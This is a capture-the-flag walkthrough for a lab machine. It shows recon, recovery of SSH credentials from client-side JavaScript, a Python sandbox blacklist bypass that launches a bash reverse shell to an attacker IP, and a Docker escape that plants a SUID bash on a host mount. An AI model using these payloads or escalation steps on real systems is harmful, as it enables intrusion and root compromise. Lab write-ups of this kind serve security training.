# Python Playground

{% embed url="https://tryhackme.com/room/pythonplayground" %}

Hard-rated CTF. Node.js web app with a Python code sandbox and Docker container. We reverse a client-side "hash" function to get SSH creds, escape the Python sandbox to get a shell inside Docker, then break out to the host.

---

## Recon

```bash
nmap -sC -sV MACHINE_IP
```

| Port | Service |
|---|---|
| 22 | SSH |
| 80 | HTTP (Node.js/Express) |

Gobuster with `.html` extension finds `/admin.html`.

---

## Step 1 — Recover SSH Credentials from Client-Side JS

Inspect `/admin.html` source. There's a JavaScript function that processes the password — it's not a proper hash, just a custom mathematical transformation on character codes.

Reverse the logic in Python:

```python
# The JS maps character codes to a predictable output
# Reverse it to recover the password for user 'connor'
encoded = [...]  # pull from JS source
password = ''.join(chr(c) for c in encoded)
print(password)
```

SSH in as `connor`:

```bash
ssh connor@MACHINE_IP
cat user.txt
```

---

## Step 2 — Python Sandbox Escape

The web app runs a Python code evaluator with a blacklist. The blacklist blocks direct imports and keywords — but we can bypass it using string concatenation and `__builtins__`:

```python
# Bypass blacklist via indirect access
__builtins__.__dict__['__import__']('os').system('bash -i >& /dev/tcp/YOUR_IP/4444 0>&1')
```

Or using `getattr`:

```python
getattr(__import__('os'), 'system')('bash -i >& /dev/tcp/YOUR_IP/4444 0>&1')
```

Catch the shell on `nc -lvnp 4444`. We're inside a Docker container.

---

## Step 3 — Docker Container Escape

Check mounts:

```bash
df -h
ls /mnt/
```

A host directory is mounted. Write a SUID shell into the shared mount:

```bash
cp /bin/bash /mnt/log/bash
chmod +s /mnt/log/bash
```

On the host (accessible via the SSH session or another path), execute it:

```bash
/mnt/log/bash -p
id   # uid=0(root)
cat /root/root.txt
```

---

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| SSH username | `connor` |
| How was the sandbox bypassed? | Blacklist bypass via `getattr`/`__builtins__` indirect access |
| How was Docker escape achieved? | Host directory mount — dropped SUID bash |
| user.txt | Retrieved from `/home/connor/user.txt` after SSH |
| root.txt | Retrieved from `/root/root.txt` after container escape |
